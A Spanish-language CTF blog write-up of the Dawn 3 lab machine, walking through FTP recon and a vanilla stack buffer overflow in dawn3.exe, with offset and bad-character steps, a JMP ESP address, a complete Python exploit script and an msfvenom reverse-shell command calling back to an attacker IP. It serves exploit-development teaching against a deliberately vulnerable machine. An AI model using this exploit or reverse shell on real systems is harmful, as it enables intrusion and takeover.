---
layout: single
title:  "Dawn 3: Vanilla Buffer Overflow"
date:   2021-07-25 16:54:50 -0500
categories: ctf
tags: oscp
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
     - label: "View Code"
       url: "https://github.com/alexfrancow"
  
---

Dawn 3 es la continuación de [Dawn 2](https://alexfrancow.github.io/ctf/Dawn-2-Vanilla-Buffer-Overflow/), desarrollada también por [@whitecr0wz](https://www.vulnhub.com/author/whitecr0wz,630/) que, como la anterior, está disponible en vulnhub y recientemente se ha añadido en [Proving Grounds](https://portal.offensive-security.com/proving-grounds/play), la máquina cuenta con un nivel de dificultad intermedia.

## Recon
Una vez iniciada la máquina se lanza un `nmap` y se observa que la máquina tiene un puerto abierto, el 2100 FTP, al iniciar sesión con anonymous se comprueba la existencia de un binario que posiblemente sea vulnerable a buffer overflow como en la anterior máquina.

```bash
nmap -sC -sV -oA nmap/nmap 192.168.212.13
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 17:53 CEST
Nmap scan report for 192.168.212.13
Host is up (0.13s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
2100/tcp open  ftp     pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.212.13:2100
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.77 seconds
```

```bash
ftp 192.168.212.13 2100
Connected to 192.168.212.13.
220 pyftpdlib 1.5.6 ready.
Name (192.168.212.13:alexfrancow): anonymous
331 Username ok, send password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe
226 Transfer complete.
```

## Buffer Overflow
Se descarga el binario y se analiza en una máquina Windows 7 32 bits con Immunity Debugger. Al abrirlo se observa que levanta un puerto, el 6812, este puerto también existirá en la máquina vulnerable.

```bash
C:\Users\alexfrancow>netstat -ano

Active Connections
  Proto  Local Address          Foreign Address        State           
  TCP    0.0.0.0:6812           0.0.0.0:0              LISTENING       2676
```

Se empezará a enviar un conjunto de 'A's para ver si el servicio se corrompe.

```bash
python2.7 -c "print 'A'*888" | nc 192.168.1.88 6812
```

Efectivamente, al enviar 888 'A's el EIP se sobreescribe con '\x41\x41\x41\x41', por lo que se confirma la existencia de un buffer overflow.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723180349.png" height="500" width="825" /></p>

### Getting the offset
Se procede a generar y a enviar un patrón de `msf-pattern_create` con una longitud de 888 caracteres. Una vez enviado se calcula el offset con el valor que se sobreescribe en el EIP y se concluye con un valor de 524, el valor exacto antes de empezar a sobreescribir el EIP.

```bash
python2.7 -c "print('$(msf-pattern_create -l 888)')" | nc 192.168.1.88 6812
^C

msf-pattern_offset -l 888 -q 35724134
[*] Exact match at offset 524
```

Algo que no se añadió en la entrada anterior fue el descartar los badchars.

¿Badchars?

Debido a cómo se programan las aplicaciones y cómo funcionan, a veces no toman ciertos bytes de manera amigable. Por ejemplo, un byte NULL (\x00) de forma predeterminada corta las conexiones. Para encontrar los badchars se genera un array de bad-chars con mona y se añade al script en Python.

```bash
!mona bytearray
```

El payload de este script llevará 4 'B's para ver con claridad en que punto empiezan los badchars.

```python
badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*524  + "B" * 4 + badchars + "C" * (888 - 524 - 4 - len(badchars))
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723181811.png" height="500" width="825" /></p>

Al enviarlo se observa que después de las 'B's se modifican los valores de los badchars que se han enviado, por lo que se confirma que '\x00' es un badchar. Se edita el script y se elimina del array de badchars el '\x00'. Después de esto se vuelve a enviar el payload.

```python
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A"*524  + "B" * 4 + badchars + "C" * (888 - 524 - 4 - len(badchars))
```

Esta vez dando como resultado que todos los posibles badchars son admitidos por la aplicación.

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723181956.png" height="500" width="825" /></p>

### JMP ESP
Una vez visto que no existen más badchars se procede a extraer la dirección de memoria que contiene el registro JMP ESP (\xff\xe4), esta instrucción saltará a la parte superior del Stack, cambiando la ubicación de EIP a la parte superior del puntero ESP y ejecutando todo lo que se envíe después de eso. 
Para ello se utilizará mona y se listarán los modulos, en este caso el que interesa es el propio binario ya que no tiene ningún tipo de protección y esto evitará que se necesiten dependencias para la explotación.

```bash
!mona modules
```

```bash
!mona find -s "\xff\xe4" -m dawn3.exe

0x52501513 : "\xff\xe4" | ascii {PAGE_EXECUTE_READ} [dawn3.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\alexfrancow\Desktop\ExploitingServices\dawn3\dawn3.exe)
```

Ya con la dirección de memoria que interesa (0x52501513), se procede a intentar si al sobreescribir el EIP se puede llegar a realizar un salto a unas 'C's inyectadas. Para ello se formará el siguiente payload:

```python
# 0x52501513 = \x13\x15\x50\x52
buffer = "A"*524  + "\x13\x15\x50\x52"+ "C" * (888 - 524 - 4 - len(badchars))
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723182901.png" height="500" width="825" /></p>

Efectivamente, podemos lograr modificar el flujo del programa y enviarlo a la dirección donde están inyectadas las 'C's, toca generar y añadir la shellcode, esta estará situada una vez el EIP se sobreescriba con la dirección de la instrucción JMP ESP.

Para la generación de la shellcode se utilizará `msfvenom` y se le indicará la instrucción de ejecutar una calculadora, quitando los badchars que se han detectado previamente:

```bash
msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00'
```

Una vez generada se añade en el script y se envia el payload:

```python
shell = ("\x8d\xd4\xa1\x40\xe4\xd1\xee\xc6\x14\xab\x7f\xa3\x1a\x18\x7f"
..snip..
"\xe6\x78\xff\x13\x6a\x51\x9a\x93\x09\xad")

# 0x52501513 = \x13\x15\x50\x52
buffer = "A"*524  + "\x13\x15\x50\x52" + shell +"C" * (888 - 524 - 4 - len(shell))
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723184455.png" height="500" width="825" /></p>

Al enviar el payload se observa que no salta a la dirección que debería, para solucionar esto se añadirán unos NoPs (\x90) de esta manera se conseguirá que salte a la siguiente instrucción.

```python
buffer = "A"*524  + "\x13\x15\x50\x52" + "\x90"*10 + shell + "C" * (888 - 524 - 4 - len(shell))
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723184641.png" height="500" width="825" /></p>

El exploit final quedaría:

```python
import socket, sys, struct

# shell = msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00'
shell = ("\x8d\xd4\xa1\x40\xe4\xd1\xee\xc6\x14\xab\x7f\xa3\x1a\x18\x7f"
..snip..
"\xe6\x78\xff\x13\x6a\x51\x9a\x93\x09\xad")

jmpesp = struct.pack("<I", 0x52501513)
buffer = "A"*524  + jmpesp + "\x90"*10 + shell + "C" * (888 - 524 - 4 - len(shell))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.88", 6812))
print("Sending payload")
s.send(buffer)
s.close()
```

Como la máquina final que se debe explotar es un Linux, se deberá generar una nueva shellcode:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.212 LPORT=9001 -f c -b '\x00' EXITFUNC=thread
```

<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723190255.png" height="500" width="825" /></p>

Como el servicio ya está siendo ejecutado como root se obtendrá acceso total a la máquina.
